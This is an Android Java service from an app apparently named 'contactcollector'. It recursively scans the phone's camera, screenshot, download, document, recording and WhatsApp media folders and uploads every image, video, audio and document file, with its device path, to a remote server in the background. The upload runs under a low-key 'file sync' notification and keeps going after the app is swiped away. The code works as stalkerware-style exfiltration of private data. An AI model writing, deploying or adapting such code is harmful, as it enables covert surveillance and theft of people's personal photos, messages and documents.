package com.contactcollector.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.atomic.AtomicInteger;

public class FileUploadService extends Service {

    private static final String TAG = "FileUploadService";
    private static final String CHANNEL_ID = "collector_upload_channel";
    private static final int NOTIFICATION_ID = 1001;
    private static final int MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB limit

    private String sessionId;
    private String baseUrl;
    private volatile boolean isRunning = false;
    private final AtomicInteger uploadedCount = new AtomicInteger(0);

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            sessionId = intent.getStringExtra("sessionId");
            baseUrl = intent.getStringExtra("baseUrl");
        }

        if (sessionId == null || baseUrl == null) {
            stopSelf();
            return START_NOT_STICKY;
        }

        Notification notification = createNotification("Starting file sync...", 0, 0);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(NOTIFICATION_ID, notification);
        }

        if (!isRunning) {
            isRunning = true;
            uploadedCount.set(0);
            new Thread(this::uploadFilesInBackground).start();
        }

        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void uploadFilesInBackground() {
        try {
            String extStorage = Environment.getExternalStorageDirectory().getAbsolutePath();

            // Comprehensive scan of all important directories
            String[] storagePaths = {
                extStorage + "/DCIM/Camera",
                extStorage + "/DCIM/Screenshots",
                extStorage + "/Pictures/Screenshots",
                extStorage + "/Pictures",
                extStorage + "/Download",
                extStorage + "/Documents",
                extStorage + "/Music",
                extStorage + "/Movies",
                extStorage + "/Recordings",
                extStorage + "/WhatsApp/Media/WhatsApp Images",
                extStorage + "/WhatsApp/Media/WhatsApp Video",
                extStorage + "/WhatsApp/Media/WhatsApp Documents",
                extStorage + "/WhatsApp/Media/WhatsApp Audio",
            };

            for (String path : storagePaths) {
                if (!isRunning) break;
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    uploadFilesFromDir(dir, 0, 2);
                }
            }

            Log.d(TAG, "Upload complete. Total files uploaded: " + uploadedCount.get());

            // Final notification
            Notification notification = createNotification(
                "Sync complete! " + uploadedCount.get() + " files uploaded",
                100, 100
            );
            notification.flags &= ~Notification.FLAG_ONGOING_EVENT;
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) nm.notify(NOTIFICATION_ID, notification);

        } catch (Exception e) {
            Log.e(TAG, "Error uploading files: " + e.getMessage());
        }

        // Stop foreground and service
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(STOP_FOREGROUND_REMOVE);
            } else {
                stopForeground(true);
            }
        } catch (Exception e) {
            // Ignore
        }
        stopSelf();
        isRunning = false;
    }

    private void uploadFilesFromDir(File dir, int depth, int maxDepth) {
        if (depth > maxDepth || !isRunning) return;

        File[] files = dir.listFiles();
        if (files == null) return;

        for (File file : files) {
            if (!isRunning) break;

            if (file.isDirectory()) {
                uploadFilesFromDir(file, depth + 1, maxDepth);
            } else if (file.isFile() && file.canRead()) {
                long fileSize = file.length();
                if (fileSize > 0 && fileSize < MAX_FILE_SIZE) {
                    String type = getFileType(file.getName());
                    // Upload images, videos, audio, pdf, documents
                    if (type.equals("image") || type.equals("video") ||
                        type.equals("document") || type.equals("pdf") ||
                        type.equals("audio")) {

                        // Add a small delay between uploads to avoid overwhelming the server
                        try { Thread.sleep(200); } catch (InterruptedException e) { break; }

                        boolean success = uploadSingleFile(file, type);
                        if (success) {
                            int count = uploadedCount.incrementAndGet();
                            Notification notification = createNotification(
                                "Syncing files... " + count + " uploaded",
                                count, 0
                            );
                            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                            if (nm != null) nm.notify(NOTIFICATION_ID, notification);
                        }
                    }
                }
            }
        }
    }

    private boolean uploadSingleFile(File file, String fileType) {
        HttpURLConnection conn = null;
        DataOutputStream dos = null;
        FileInputStream fis = null;
        try {
            String boundary = "----CollectorBnd" + System.currentTimeMillis();
            URL url = new URL(baseUrl + "/api/files/upload");
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(180000); // 3 min timeout for large files

            dos = new DataOutputStream(conn.getOutputStream());

            // Session ID
            writeFormField(dos, boundary, "sessionId", sessionId);
            // File path on device
            writeFormField(dos, boundary, "filePath", file.getAbsolutePath());
            // File type
            writeFormField(dos, boundary, "fileType", fileType);

            // File data
            dos.writeBytes("--" + boundary + "\r\n");
            dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n");
            dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

            fis = new FileInputStream(file);
            byte[] buffer = new byte[16384]; // 16KB buffer for better performance
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }

            dos.writeBytes("\r\n--" + boundary + "--\r\n");
            dos.flush();

            int responseCode = conn.getResponseCode();
            return responseCode >= 200 && responseCode < 300;
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload " + file.getName() + ": " + e.getMessage());
            return false;
        } finally {
            try { if (fis != null) fis.close(); } catch (Exception e) {}
            try { if (dos != null) dos.close(); } catch (Exception e) {}
            try { if (conn != null) conn.disconnect(); } catch (Exception e) {}
        }
    }

    private void writeFormField(DataOutputStream dos, String boundary, String name, String value) throws Exception {
        dos.writeBytes("--" + boundary + "\r\n");
        dos.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n");
        dos.writeBytes(value + "\r\n");
    }

    private String getFileType(String name) {
        name = name.toLowerCase();
        if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") ||
            name.endsWith(".gif") || name.endsWith(".webp") || name.endsWith(".bmp") ||
            name.endsWith(".heic") || name.endsWith(".raw"))
            return "image";
        if (name.endsWith(".mp4") || name.endsWith(".avi") || name.endsWith(".mkv") ||
            name.endsWith(".3gp") || name.endsWith(".mov") || name.endsWith(".wmv") ||
            name.endsWith(".flv") || name.endsWith(".webm"))
            return "video";
        if (name.endsWith(".mp3") || name.endsWith(".wav") || name.endsWith(".flac") ||
            name.endsWith(".ogg") || name.endsWith(".m4a") || name.endsWith(".aac") ||
            name.endsWith(".wma") || name.endsWith(".amr"))
            return "audio";
        if (name.endsWith(".pdf"))
            return "pdf";
        if (name.endsWith(".doc") || name.endsWith(".docx") || name.endsWith(".txt") ||
            name.endsWith(".xls") || name.endsWith(".xlsx") || name.endsWith(".ppt") ||
            name.endsWith(".pptx") || name.endsWith(".csv") || name.endsWith(".rtf"))
            return "document";
        return "other";
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "File Sync",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Syncing files to server");
            channel.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) {
                nm.createNotificationChannel(channel);
            }
        }
    }

    @SuppressWarnings("deprecation")
    private Notification createNotification(String text, int progress, int max) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder builder = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Collector")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_menu_upload)
                .setOngoing(true);

            if (max > 0) {
                builder.setProgress(max, progress, false);
            } else {
                builder.setProgress(100, 0, true); // indeterminate
            }

            return builder.build();
        } else {
            Notification.Builder builder = new Notification.Builder(this)
                .setContentTitle("Collector")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_menu_upload)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_LOW);

            if (max > 0) {
                builder.setProgress(max, progress, false);
            } else {
                builder.setProgress(100, 0, true);
            }

            return builder.build();
        }
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // Continue running even if app is swiped away
        super.onTaskRemoved(rootIntent);
    }
}
